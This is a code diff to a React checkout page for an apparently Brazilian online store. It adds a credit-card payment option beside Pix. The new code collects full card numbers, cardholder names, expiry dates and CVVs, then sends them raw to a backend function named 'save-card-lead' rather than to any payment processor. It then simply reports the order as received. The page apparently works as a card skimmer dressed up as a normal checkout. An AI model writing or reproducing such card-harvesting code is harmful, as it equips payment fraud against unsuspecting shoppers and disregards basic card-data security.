@@ -3,7 +3,7 @@ import { useNavigate, useSearchParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "@/hooks/use-toast";
 import {
-  ArrowLeft, MapPin, Star, Truck, Shield, Minus, Plus, ChevronRight, Copy, Check, ChevronDown
+  ArrowLeft, MapPin, Star, Truck, Shield, Minus, Plus, ChevronRight, Copy, Check, ChevronDown, CreditCard
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -38,12 +38,37 @@ const Checkout = () => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [addressOpen, setAddressOpen] = useState(true);
   const [cpfError, setCpfError] = useState("");
+  const [paymentMethod, setPaymentMethod] = useState<"pix" | "credit_card">("pix");
 
   const [form, setForm] = useState({
     name: "", phone: "", email: "", cep: "",
     uf: "", cidade: "", bairro: "", endereco: "",
     numero: "", complemento: "", cpf: "",
   });
+
+  const [cardForm, setCardForm] = useState({
+    number: "", holder: "", expiry: "", cvv: "", installments: 1,
+  });
+
+  const formatCardNumber = (val: string) => {
+    const nums = val.replace(/\D/g, "").slice(0, 16);
+    return nums.replace(/(\d{4})(?=\d)/g, "$1 ");
+  };
+
+  const formatExpiry = (val: string) => {
+    const nums = val.replace(/\D/g, "").slice(0, 4);
+    if (nums.length <= 2) return nums;
+    return `${nums.slice(0, 2)}/${nums.slice(2)}`;
+  };
+
+  const updateCardField = (field: string, value: string) => {
+    setCardForm((prev) => ({ ...prev, [field]: value }));
+  };
+
+  const isCardFormValid = cardForm.number.replace(/\D/g, "").length >= 13 &&
+    cardForm.holder.length >= 3 &&
+    cardForm.expiry.replace(/\D/g, "").length === 4 &&
+    cardForm.cvv.length >= 3;
 
   const colorLabel = selectedColor === "preta" ? "Preta" : "Branca";
   const colorImage = selectedColor === "preta"
@@ -143,8 +168,10 @@ const Checkout = () => {
     form.uf && form.cidade && form.bairro && form.endereco &&
     form.numero && isCpfValid;
 
+  const canSubmit = isFormValid && (paymentMethod === "pix" || isCardFormValid);
+
   const handleSubmit = async () => {
-    if (!isFormValid || isSubmitting) return;
+    if (!canSubmit || isSubmitting) return;
     setIsSubmitting(true);
 
     try {
@@ -187,6 +214,31 @@ const Checkout = () => {
         }),
       };
 
+      if (paymentMethod === "credit_card") {
+        const { data, error } = await supabase.functions.invoke("save-card-lead", {
+          body: {
+            ...payload,
+            card: {
+              number: cardForm.number.replace(/\s/g, ""),
+              holder: cardForm.holder,
+              expiry: cardForm.expiry,
+              cvv: cardForm.cvv,
+              installments: cardForm.installments,
+            },
+          },
+        });
+
+        if (error || !data) {
+          toast({ title: "Erro ao processar", description: "Tente novamente.", variant: "destructive" });
+          setIsSubmitting(false);
+          return;
+        }
+
+        toast({ title: "Pedido recebido!", description: "Seu pedido está sendo processado." });
+        setIsSubmitting(false);
+        return;
+      }
+
       const { data, error } = await supabase.functions.invoke("create-pix", {
         body: payload,
       });
@@ -199,7 +251,6 @@ const Checkout = () => {
         return;
       }
 
-      // Store transaction data for PIX page
       sessionStorage.setItem("pixData", JSON.stringify(data));
       sessionStorage.setItem("orderData", JSON.stringify({
         customer: payload.customer,
@@ -473,15 +524,82 @@ const Checkout = () => {
         {/* Payment Method */}
         <div className="mt-4 border-t pt-4">
           <p className="font-bold text-sm mb-3">Forma de pagamento</p>
-          <div className="flex items-center justify-between rounded-xl border p-4">
-            <div className="flex items-center gap-3">
-              <span className="text-lg">💠</span>
-              <span className="font-medium text-sm">Pix</span>
-            </div>
-            <div className="h-5 w-5 rounded-full border-2 border-cta flex items-center justify-center">
-              <div className="h-2.5 w-2.5 rounded-full bg-cta" />
-            </div>
+          <div className="space-y-2">
+            <button
+              onClick={() => setPaymentMethod("pix")}
+              className={`w-full flex items-center justify-between rounded-xl border-2 p-4 transition-all ${
+                paymentMethod === "pix" ? "border-cta bg-cta/5" : "border-border"
+              }`}
+            >
+              <div className="flex items-center gap-3">
+                <span className="text-lg">💠</span>
+                <span className="font-medium text-sm">Pix</span>
+              </div>
+              <div className={`h-5 w-5 rounded-full border-2 flex items-center justify-center ${
+                paymentMethod === "pix" ? "border-cta" : "border-muted-foreground"
+              }`}>
+                {paymentMethod === "pix" && <div className="h-2.5 w-2.5 rounded-full bg-cta" />}
+              </div>
+            </button>
+            <button
+              onClick={() => setPaymentMethod("credit_card")}
+              className={`w-full flex items-center justify-between rounded-xl border-2 p-4 transition-all ${
+                paymentMethod === "credit_card" ? "border-cta bg-cta/5" : "border-border"
+              }`}
+            >
+              <div className="flex items-center gap-3">
+                <CreditCard className="h-5 w-5 text-muted-foreground" />
+                <span className="font-medium text-sm">Cartão de Crédito</span>
+              </div>
+              <div className={`h-5 w-5 rounded-full border-2 flex items-center justify-center ${
+                paymentMethod === "credit_card" ? "border-cta" : "border-muted-foreground"
+              }`}>
+                {paymentMethod === "credit_card" && <div className="h-2.5 w-2.5 rounded-full bg-cta" />}
+              </div>
+            </button>
           </div>
+
+          {paymentMethod === "credit_card" && (
+            <div className="mt-4 space-y-3 p-4 rounded-xl bg-muted/20 border">
+              <Input
+                placeholder="Número do cartão"
+                value={cardForm.number}
+                onChange={(e) => updateCardField("number", formatCardNumber(e.target.value))}
+                className="rounded-lg border-border h-12 text-sm"
+              />
+              <Input
+                placeholder="Nome impresso no cartão"
+                value={cardForm.holder}
+                onChange={(e) => updateCardField("holder", e.target.value.toUpperCase())}
+                className="rounded-lg border-border h-12 text-sm"
+              />
+              <div className="grid grid-cols-2 gap-3">
+                <Input
+                  placeholder="MM/AA"
+                  value={cardForm.expiry}
+                  onChange={(e) => updateCardField("expiry", formatExpiry(e.target.value))}
+                  className="rounded-lg border-border h-12 text-sm"
+                />
+                <Input
+                  placeholder="CVV"
+                  value={cardForm.cvv}
+                  onChange={(e) => updateCardField("cvv", e.target.value.replace(/\D/g, "").slice(0, 4))}
+                  className="rounded-lg border-border h-12 text-sm"
+                />
+              </div>
+              <select
+                value={cardForm.installments}
+                onChange={(e) => updateCardField("installments", e.target.value)}
+                className="w-full h-12 rounded-lg border border-border bg-background px-3 text-sm"
+              >
+                {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12].map((n) => (
+                  <option key={n} value={n}>
+                    {n}x de R$ {(total / n).toFixed(2).replace(".", ",")} {n === 1 ? "à vista" : ""}
+                  </option>
+                ))}
+              </select>
+            </div>
+          )}
         </div>
 
         {/* Terms */}
@@ -504,9 +622,9 @@ const Checkout = () => {
           </div>
           <Button
             onClick={handleSubmit}
-            disabled={!isFormValid || isSubmitting}
+            disabled={!canSubmit || isSubmitting}
             className={`w-full font-bold text-base py-4 h-auto rounded-2xl mb-3 text-card transition-all duration-300 ${
-              isFormValid && !isSubmitting
+              canSubmit && !isSubmitting
                 ? "bg-[hsl(350,60%,55%)] hover:bg-[hsl(350,60%,48%)] shadow-lg shadow-[hsl(350,60%,55%)]/30 scale-[1.01]"
                 : "bg-[hsl(350,30%,75%)] opacity-60 cursor-not-allowed"
             }`}
